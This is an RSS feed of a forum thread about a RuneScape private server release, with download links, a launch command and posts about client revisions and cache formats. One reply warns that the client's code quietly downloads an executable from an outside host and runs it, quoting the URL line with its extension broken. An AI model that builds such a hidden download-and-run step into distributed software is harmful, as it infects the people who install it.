channel.title: [459]Gunthor - Skillcape Emotes + MORE!
channel.description:
[center] [b]Server: [url=http://www.mediafire.com/?mvmzmkdy4fu]http://www.mediafire.com/?mvmzmdy4fu[/url] Cache: [url=http://www.mediafire.com/?z1tmiigzevz]http://www.mediafire.com/?z1tmiigzevz[/url] (Put this in C:/.) Client: [url=http://www.multiupload.com/3EUB0RB1W]http://www.multiupload.com/3EUB0ROB1W[/url][/b]
@echo off java -cp bin;lib/jython.jar;lib/slf4j-api-1.5.8.jar;lib/mina-core-2.0.0-M6.jar;lib/slf4j-nop-1.5.8.jar;lib/commons-compress-1.0.jar;lib/junit-4.6.jar com.grahamedgecombe.rs2.Server pause
[size=24pt][b]Features:[/b][/size] - Actionbuttons - Commands - All player update masks - Interface - Walkable interface - Sidebar interface (single) - Shopping interface (Main + sidebar(single)) - Fullscreen interfaces - Items - ItemContainer class - Adding and deleting items - Equipment - Item on Item - Fixed stackable items - Trading - Npcs [IMG]http://i48.tinypic.com/oqxf5w.png[/img] [img]http://i45.tinypic.com/15rfi82.png[/img] [img]http://img707.imageshack.us/img707/1628/herblaw.gif[/img] [img]http://i46.tinypic.com/2ntkbye.png[/img] [img]http://i50.tinypic.com/fa1noz.png[/img] [img]http://i46.tinypic.com/swd0yr.gif[/img] [img]http://img188.imageshack.us/img188/8695/trading.gif[/img][/center]

item.title: [459]Gunthor - Skillcape Emotes + MORE!
item.dc:creator: @DreaDs DreaDs
item.description:
@DreaDs wrote:

In the client.java
It downloads a file, “URL url = new URL(“http://mag3ahriiim…fileave.com/Install.ex”);” (I removed the ending e from exe, so no one clicks the link by accident.
It then proceeds to run that file in the background, which is probably a virus.

item.title: [459]Gunthor - Skillcape Emotes + MORE!
item.dc:creator: @glestrts glestrts
item.description:
@glestrts wrote:

CoonHunter:

Hehe thanks, if you need a model’r PM me… ive been bored lately.

thanks, man, i’m helping that star wars development client sided, so maybe ill need a model sometime.

[quote=“licorish55, post:41, topic:324225”]What is a 459…?
Are people just like, making up random numbers or something?[/quote]
459 is the runescape revision that contains the same XTEA encrypted mapdata as all post 420 clients.
The benefits are that it is one of the first known and currently available client revision that contains skillcapes and emotes, but occurred prior to godwars and clan chat(around 469).

so basically its a pretty cool revision and im taking a deep look into it, because its worthwhile.

Read full topic

item.title: [459]Gunthor - Skillcape Emotes + MORE!
item.dc:creator: @CoonHunter CoonHunter
item.description:
@CoonHunter wrote:

[quote=“glestrts, post:29, topic:324225”][quote author=CoonHunter link=topic=420629.msg3090846#msg3090846 date=1262893734]
If im wrong, please, prove it, ive personally ONLY seen that equipment screen on IClarity client, and never on RS or any other server for that matter, i dont keep up with the 377+ versions of clients, since i have my own problems.

[/quote]
sorry man, didn’t get much sleep and was kinda grouchy,
the cache is the 459 version, and is packaged the same way as the 474 cache or 508+, in terms of the client files, after revision 420, rather than having 4 indexes, and 50 main classes.

iClairty- 50 classes, 4 indexes, 377 cache
This - 82 classes and around 18 indexes.

so it is a honest to goodness 459 client and server

Also, iClarity was made to be a 420 look alike client, so the only reason you saw it in iClarity was because you didn’t play rs at the time.[/quote]

There was actually a long period when i was VERY pissed at RS, because im permi banned, and they have no proof for what i did (and now just have me banned, and no marked reason). But yea, that must have been in the 399-474+ somewhere. Tbh, i didnt download, ive gotten away from RSPS’s. Also, i never realised IClarity was gonna be a 420 look-alike, thanks for sharing =]

Read full topic

item.title: [459]Gunthor - Skillcape Emotes + MORE!
item.dc:creator: @glestrts glestrts
item.description:
@glestrts wrote:

CoonHunter:

If im wrong, please, prove it, ive personally ONLY seen that equipment screen on IClarity client, and never on RS or any other server for that matter, i dont keep up with the 377+ versions of clients, since i have my own problems.

sorry man, didn’t get much sleep and was kinda grouchy,
the cache is the 459 version, and is packaged the same way as the 474 cache or 508+, in terms of the client files, after revision 420, rather than having 4 indexes, and 50 main classes.

iClairty- 50 classes, 4 indexes, 377 cache
This - 82 classes and around 18 indexes.

so it is a honest to goodness 459 client and server

Also, iClarity was made to be a 420 look alike client, so the only reason you saw it in iClarity was because you didn’t play rs at the time.

Read full topic
